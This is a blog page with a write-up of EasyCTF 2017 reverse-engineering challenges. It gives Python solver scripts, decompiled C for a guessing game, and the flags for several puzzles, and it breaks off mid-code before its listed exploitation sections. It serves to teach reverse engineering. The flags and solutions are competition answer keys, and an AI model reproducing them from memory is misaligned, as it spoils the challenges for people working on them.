<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="robots" content="index,follow"><meta name="description" content="作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/] 博客:HackFun [https://www.hackfun.org]  #0X06-REVERSE-ENGINEERING0X06 REVERSE ENGINEERING #HEXABLEHEXABLE #PROBLEMPROBLEM I tried to hide a flag sne"><meta name="keywords" content="ctf writeup,easyctf,pwn,reverse engineering,binary exploitation"><meta property="og:type" content="article"><meta property="og:title" content="EasyCTF 2017 Reverse Pwn Write Up"><meta property="og:url" content="https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/index.html"><meta property="og:site_name" content="Hackfun"><meta property="og:description" content="作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/] 博客:HackFun [https://www.hackfun.org]  #0X06-REVERSE-ENGINEERING0X06 REVERSE ENGINEERING #HEXABLEHEXABLE #PROBLEMPROBLEM I tried to hide a flag sne"><meta property="og:image" content="http://i.imgur.com/EYMzgNU.png"><meta property="og:image" content="http://i.imgur.com/Lynz2lq.png"><meta property="og:image" content="http://i1.piimg.com/589513/73430c431965b22f.png"><meta property="og:image" content="http://i4.buimg.com/589513/91044f6f9469e567.png"><meta property="og:image" content="http://i4.buimg.com/589513/458cf5848cda5d98.png"><meta property="og:image" content="http://i4.buimg.com/589513/601f78cff8149259.png"><meta property="og:image" content="http://i2.muimg.com/589513/825bd842a912a237.png"><meta property="og:image" content="http://i2.muimg.com/589513/ff66d77073b68805.png"><meta property="og:image" content="http://i1.piimg.com/589513/6c4cd7da413afb24.png"><meta property="og:updated_time" content="2017-10-02T19:22:31.926Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="EasyCTF 2017 Reverse Pwn Write Up"><meta name="twitter:description" content="作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/] 博客:HackFun [https://www.hackfun.org]  #0X06-REVERSE-ENGINEERING0X06 REVERSE ENGINEERING #HEXABLEHEXABLE #PROBLEMPROBLEM I tried to hide a flag sne"><meta name="twitter:image" content="http://i.imgur.com/EYMzgNU.png"><meta name="twitter:creator" content="@jinglingbiaodi"><link rel="publisher" href="https://plus.google.com/117450799036676139034"><meta property="fb:admins" content="jinglingbiaodi"><meta property="fb:app_id" content="jinglingbiaodi"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>EasyCTF 2017 Reverse Pwn Write Up</title><link rel="stylesheet" href="/css/style.css"><link rel="alternate" href="/atom.xml" title="Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up" type="application/atom+xml"></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Link</a></li><li><a href="/archives/">Archives</a></li><li><a href="http://github.com/sunnyelf">Projects</a></li><li><a href="/search/">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="/2017/04/24/Webshell密码极速爆破工具-cheetah/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/2017/04/09/EasyCTF-2017-Web-Write-Up/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&text=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&is_video=false&description=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=EasyCTF 2017 Reverse Pwn Write Up&body=Check out this article: https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&name=EasyCTF 2017 Reverse Pwn Write Up&description=&lt;p&gt;作者:&lt;a href=&#34;https://www.zhihu.com/people/sunnyelf/&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;Jing Ling&lt;/a&gt;&lt;br&gt;博客:&lt;a href=&#34;https://www.hackfun.org&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;HackFun&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&#34;0x06-Reverse-Engineering&#34;&gt;&lt;a href=&#34;#0x06-Reverse-Engineering&#34; class=&#34;headerlink&#34; title=&#34;0x06 Reverse Engineering&#34;&gt;&lt;/a&gt;0x06 Reverse Engineering&lt;/h1&gt;&lt;h2 id=&#34;Hexable&#34;&gt;&lt;a href=&#34;#Hexable&#34; class=&#34;headerlink&#34; title=&#34;Hexable&#34;&gt;&lt;/a&gt;Hexable&lt;/h2&gt;&lt;h3 id=&#34;problem&#34;&gt;&lt;a href=&#34;#problem&#34; class=&#34;headerlink&#34; title=&#34;problem&#34;&gt;&lt;/a&gt;problem&lt;/h3&gt;&lt;p&gt;I tried to hide a flag sneakily, can you find it? &lt;a href=&#34;https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hexable-autogen/hexable&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;"><i class="fa fa-tumblr" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-Reverse-Engineering"><span class="toc-number">1.</span> <span class="toc-text">0x06 Reverse Engineering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hexable"><span class="toc-number">1.1.</span> <span class="toc-text">Hexable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phunky-Python-I"><span class="toc-number">1.2.</span> <span class="toc-text">Phunky Python I</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Useless-Python"><span class="toc-number">1.3.</span> <span class="toc-text">Useless Python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phunky-Python-II"><span class="toc-number">1.4.</span> <span class="toc-text">Phunky Python II</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lucky-Guess"><span class="toc-number">1.5.</span> <span class="toc-text">Lucky Guess</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hex-QR"><span class="toc-number">1.6.</span> <span class="toc-text">Hex QR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#67k"><span class="toc-number">1.7.</span> <span class="toc-text">67k</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heaps-of-Knowledge"><span class="toc-number">1.8.</span> <span class="toc-text">Heaps of Knowledge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Morphin"><span class="toc-number">1.9.</span> <span class="toc-text">Morphin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-Binary-Exploitation"><span class="toc-number">2.</span> <span class="toc-text">0x07 Binary Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Risky-Business"><span class="toc-number">2.1.</span> <span class="toc-text">Risky Business</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-8"><span class="toc-number">2.1.1.</span> <span class="toc-text">problem</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Doubly-Dangerous"><span class="toc-number">2.2.</span> <span class="toc-text">Doubly Dangerous</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-9"><span class="toc-number">2.2.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-8"><span class="toc-number">2.2.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-Rop"><span class="toc-number">2.3.</span> <span class="toc-text">Simple Rop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-10"><span class="toc-number">2.3.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-9"><span class="toc-number">2.3.2.</span> <span class="toc-text">solution</span></a></li></ol></li></ol></li></ol></div></span></div><div class="content index width mx-auto px2 my4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">EasyCTF 2017 Reverse Pwn Write Up</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><i class="fa fa-user-secret"></i><span itemprop="name">Jing Ling</span> </span><i class="fa fa-calendar"></i><div class="postdate"><time datetime="2017-04-09T02:35:00.000Z" itemprop="datePublished">2017-04-09</time></div><i class="fa fa-eye"></i><span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span></span><div class="article-tag"><i class="fa fa-tags"></i> <a class="tag-link" href="/tags/binary-exploitation/">binary exploitation</a>, <a class="tag-link" href="/tags/ctf-writeup/">ctf writeup</a>, <a class="tag-link" href="/tags/easyctf/">easyctf</a>, <a class="tag-link" href="/tags/pwn/">pwn</a>, <a class="tag-link" href="/tags/reverse-engineering/">reverse engineering</a></div></div></header><div class="content" itemprop="articleBody"><p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x06-Reverse-Engineering"><a href="#0x06-Reverse-Engineering" class="headerlink" title="0x06 Reverse Engineering"></a>0x06 Reverse Engineering</h1><h2 id="Hexable"><a href="#Hexable" class="headerlink" title="Hexable"></a>Hexable</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I tried to hide a flag sneakily, can you find it? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hexable-autogen/hexable" target="_blank" rel="external">Download</a></p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/EYMzgNU.png" alt=""></p><h2 id="Phunky-Python-I"><a href="#Phunky-Python-I" class="headerlink" title="Phunky Python I"></a>Phunky Python I</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>The other day we happened upon a dusty old laptop covered in duct tape and surrounded by several papers with notes scrawled all over them. Upon inspection, we found that the laptop contained several python files labeled <code>phunky</code>.</p><p>We’ve determined that each of the files contains a mini reversing challenge. The first task is simple: Find the value of <code>x</code> such that the program prints out <code>easyctf</code> (make sure it’s lowercase!).</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/phunkypython1" target="_blank" rel="external">phunky1.py</a></p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x = <span class="number">9758391023608105872L</span> - <span class="number">102</span></div><div class="line">digs = [<span class="number">9758391023608105871L</span>, <span class="number">9758391023608105867L</span>, <span class="number">9758391023608105885L</span>, <span class="number">9758391023608105891L</span>, <span class="number">9758391023608105869L</span>, <span class="number">9758391023608105886L</span>, <span class="number">9758391023608105872L</span>]</div><div class="line">out = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> reversed(digs):</div><div class="line">   	out = chr(letter - x) + out</div><div class="line"><span class="keyword">print</span> out + <span class="string">'&#123;'</span> + str(x) + <span class="string">'&#125;'</span></div></pre></td></tr></table></figure><p>flag：<code>easyctf{9758391023608105770}</code></p><h2 id="Useless-Python"><a href="#Useless-Python" class="headerlink" title="Useless Python"></a>Useless Python</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>Boredom took over, so I wrote this python file! I didn’t want anyone to see it though because it doesn’t actually run, so I used the coolest base-16 encoding to keep it secret. <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/useless-python/useless.py" target="_blank" rel="external">python</a></p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">s=open(<span class="string">'useless.py'</span>).read()</div><div class="line">s=s.decode(<span class="string">'hex'</span>)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> <span class="string">'exec('</span> <span class="keyword">in</span> s:</div><div class="line">        s = eval(s[<span class="number">5</span>:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><hr><pre><code>flag = &apos;easyctf{python_3x3c_exec_3xec_ex3c}&apos;
priint flag
</code></pre><h2 id="Phunky-Python-II"><a href="#Phunky-Python-II" class="headerlink" title="Phunky Python II"></a>Phunky Python II</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>We stumbled across another phunky Python file. Can you find the redacted value of jkx that makes this program print <code>True</code>?</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>题目：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> operator</div><div class="line">jkx = <span class="number">0</span> <span class="comment"># REDACTED</span></div><div class="line">pork = ((<span class="number">12</span>*jkx+<span class="number">44</span>)/<span class="number">4</span>)-(<span class="number">1234</span>/<span class="number">617</span>)*jkx-sum([<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>])</div><div class="line">jkx *= pork</div><div class="line">pp = filter(<span class="keyword">lambda</span> g: <span class="keyword">not</span> any(g % u == <span class="number">0</span> <span class="keyword">for</span> u <span class="keyword">in</span> range(<span class="number">2</span>, g)), range(<span class="number">2</span>, <span class="number">10000</span>))</div><div class="line">b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str(jkx)))))</div><div class="line"><span class="keyword">print</span> b == <span class="number">6548044661510965675361835669609097497614277988316628335954865908614987464656662774230164176397886049495203497380194320473112237121935351588106637391652296924206523967496334906449626062538176842451446687574581963609515235677360001918335627990557065870263618484501558703622228018822062325974112864876000000</span></div></pre></td></tr></table></figure><p></p><p>第3行简化一下：</p><pre><code>pork = ((12*jkx+44)/4)-(1234/617)*jkx-sum([1, 4, 7])
pork = (3*jkx+11)-(1234/617)*jkx-12
pork = 3*jkx+11-2*jkx-12
pork = jkx - 1
</code></pre><p>结合第四行再次简化：</p><pre><code>jkx = jkx*(jkx-1)
</code></pre><p>第五行：<code>pp = filter(lambda g: not any(g % u == 0 for u in range(2, g)), range(2, 10000))</code>是生成小于10000的所有质数列表（这语法骚得不行Orz）</p><p><img src="http://i.imgur.com/Lynz2lq.png" alt=""></p><p>第六行：<code>b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) for i in range(len(str(jkx)))))</code></p><p>即：</p><pre><code>b = 1
for i in range(len(str(jkx))):
    b = b * (pp[i] ** int(str(jkx)[i])
</code></pre><p>比如我们输入jkx值为123，那么就会计算b = (<strong>2</strong> ^ <code>1</code>) <em>(<strong>3</strong> ^ <code>2</code>) </em>(<strong>5</strong> ^ <code>3</code>)</p><p>参考ValarDragon表哥的解法<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="comment">#First step:</span></div><div class="line"><span class="comment">#Factor the number</span></div><div class="line">endnum = <span class="number">1165547315017833928671818221519514360217364769512850694972634276966608764777139685632107196533251916113636826873618982702626918260245806732321339626796631711528838400321866758812099562803500967678699400226626798016068690575469938736199168207523212687169370000</span></div><div class="line">primes = filter(<span class="keyword">lambda</span> g: <span class="keyword">not</span> any(g % u == <span class="number">0</span> <span class="keyword">for</span> u <span class="keyword">in</span> range(<span class="number">2</span>, g)), range(<span class="number">2</span>, <span class="number">10000</span>))</div><div class="line">exps = []</div><div class="line"><span class="comment">#get prime factorization</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> primes:</div><div class="line">    k = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span>(endnum % i == <span class="number">0</span>):</div><div class="line">        k+=<span class="number">1</span></div><div class="line">        endnum /= i</div><div class="line">    exps.append(k)</div><div class="line">    <span class="keyword">if</span>(endnum == <span class="number">1</span>):</div><div class="line">        <span class="keyword">break</span></div><div class="line">print(<span class="string">"exponents = %s"</span> %exps)</div><div class="line"><span class="comment">#Factorization obtained</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">floorSqrt</span><span class="params">(n)</span>:</span></div><div class="line">    x = n</div><div class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></div><div class="line">    <span class="keyword">while</span> y &lt; x:</div><div class="line">        x = y</div><div class="line">        y = (x + n // x) // <span class="number">2</span></div><div class="line">    <span class="keyword">return</span> x</div><div class="line"></div><div class="line">jkx2 = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> exps:</div><div class="line">    jkx2 += str(k)</div><div class="line">jkx2 = int(jkx2)</div><div class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</div><div class="line">    breakEarly = <span class="keyword">False</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        jkxapprox = floorSqrt(jkx2)</div><div class="line">        <span class="keyword">assert</span> jkx2 == jkxapprox*(jkxapprox+<span class="number">1</span>)</div><div class="line">        print(<span class="string">"jkx2 = %s"</span> % jkx2)</div><div class="line">        print(<span class="string">"jkx  = %s"</span> % (jkxapprox+<span class="number">1</span>))</div><div class="line">        breakEarly = <span class="keyword">True</span></div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">except</span> AssertionError:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">if</span>(breakEarly):</div><div class="line">        <span class="keyword">break</span></div><div class="line">    jkx2 *= <span class="number">10</span></div></pre></td></tr></table></figure><p></p><h2 id="Lucky-Guess"><a href="#Lucky-Guess" class="headerlink" title="Lucky Guess"></a>Lucky Guess</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Would you like to play <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/luckyguess/guess" target="_blank" rel="external">a guessing game</a>?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// rax@8</span></div><div class="line">  __int64 v6; <span class="comment">// rax@10</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax@11</span></div><div class="line">  __int64 v8; <span class="comment">// rax@12</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+0h] [bp-A0h]@1</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+4h] [bp-9Ch]@1</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-98h]@3</span></div><div class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+Ch] [bp-94h]@1</span></div><div class="line">  <span class="keyword">int</span> v13[<span class="number">36</span>]; <span class="comment">// [sp+10h] [bp-90h]@1</span></div><div class="line"></div><div class="line">  primp();</div><div class="line">  qmemcpy(v13, <span class="string">"g"</span>, <span class="number">0x88</span>uLL);</div><div class="line">  v3 = time(<span class="number">0L</span>L);</div><div class="line">  srand(v3);</div><div class="line">  v12 = rand() % <span class="number">0x4000000</span>;</div><div class="line">  v10 = <span class="number">0</span>;</div><div class="line">  v9 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    v7 = v10++;</div><div class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">22</span> )</div><div class="line">    &#123;</div><div class="line">      LODWORD(v8) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">"no dice."</span>);</div><div class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">"Guess? "</span>);</div><div class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v9);</div><div class="line">    <span class="keyword">if</span> ( v9 == v12 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">if</span> ( v9 &gt;= v12 )</div><div class="line">      v5 = <span class="string">"hi"</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">      v5 = <span class="string">"lo"</span>;</div><div class="line">    LODWORD(v6) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)v5);</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span 